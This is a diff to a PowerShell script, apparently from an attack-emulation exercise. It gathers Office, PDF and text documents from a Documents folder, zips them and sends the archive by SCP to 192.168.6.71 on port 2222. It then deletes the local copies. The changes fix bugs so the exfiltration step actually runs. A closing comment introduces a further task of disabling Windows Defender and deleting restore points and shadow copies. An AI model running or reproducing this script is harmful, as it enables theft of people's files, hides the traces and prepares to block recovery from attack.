@@ -10,8 +10,8 @@ Set-Location $PSScriptRoot
 # http://devhawk.net/blog/2010/1/22/fixing-powershells-busted-resolve-path-cmdlet
 function Resolve-ForcePath($filename) # Awkward rename from "force-resolve-path" to shut up "Approved Verbs" warning
 {
-  $filename = Resolve-Path $filename -ErrorAction SilentlyContinue
-                                     -ErrorVariable _frperror
+  $filename = Resolve-Path $filename -ErrorAction SilentlyContinue -ErrorVariable _frperror
+                            
   if (!$filename)
   {
     return $_frperror[0].TargetObject
@@ -25,8 +25,8 @@ Get-ChildItem -Recurse -Include *.docx,*.xlsx,*.pdf,*.txt -Path .\Documents | Fo
  # Check if the parent directory's "shadow" exists within .\Exfiltration-Dir. If not, make it.
     $parent_dir = Resolve-Path -Relative $_.DirectoryName
     $parent_shadow = Resolve-ForcePath (Join-Path .\Exfiltration-Dir $parent_dir)
-    If (-Not(Test-Path -Path $parent_shadow)) {
-        New-Item -ItemType Directory -Name $parent_shadow
+    If (-Not (Test-Path -Path $parent_shadow)) {
+        New-Item -ItemType Directory -Path $parent_shadow
     }
     # copy the item to $parent_shadow
     Copy-Item -Path $_ -Destination $parent_shadow
@@ -36,8 +36,8 @@ Compress-Archive -Path .\Exfiltration-Dir -DestinationPath .\To-Exfiltrate.zip
 Remove-Item -Recurse -Force .\Exfiltration-Dir
 
 # Copy .\To-Exfiltrate.zip to SSH server on 192.168.6.71 port 2222
-Set-SCPItem -ComputerName '192.168.6.71' -Port 2222 -Credential (Get-Credential -Message "Credentials for SSH Server")
-
+Set-SCPItem -ComputerName '192.168.6.71' -Port 2222 -Credential (Get-Credential -Message "Credentials for SSH Server") -Path .\To-Exfiltrate.zip -Destination "~/"
+Remove-Item .\To-Exfiltrate.zip
 # ----------- TASK 2 ------------------------------------------------------------------------------------------------------
 # The really nasty stuff: Disable Windows Defender and delete Restore Points and Volume Shadow Copies
 
